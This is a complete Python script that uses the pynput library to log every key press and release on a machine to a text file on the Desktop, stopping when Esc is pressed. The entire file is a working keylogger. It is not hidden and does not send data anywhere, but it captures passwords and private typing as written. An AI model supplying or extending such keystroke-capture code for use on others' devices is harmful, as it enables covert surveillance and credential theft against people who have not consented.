from pynput import keyboard

# Replace "C:/Users/YourUsername/Desktop/log.txt" with the path and filename of your choice
log_file = "C:/Users/YourUsername/Desktop/log.txt"

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write('Key {} pressed.\n'.format(key.char))
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write('Special key {} pressed.\n'.format(key))
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def on_release(key):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write('Key {} released.\n'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass
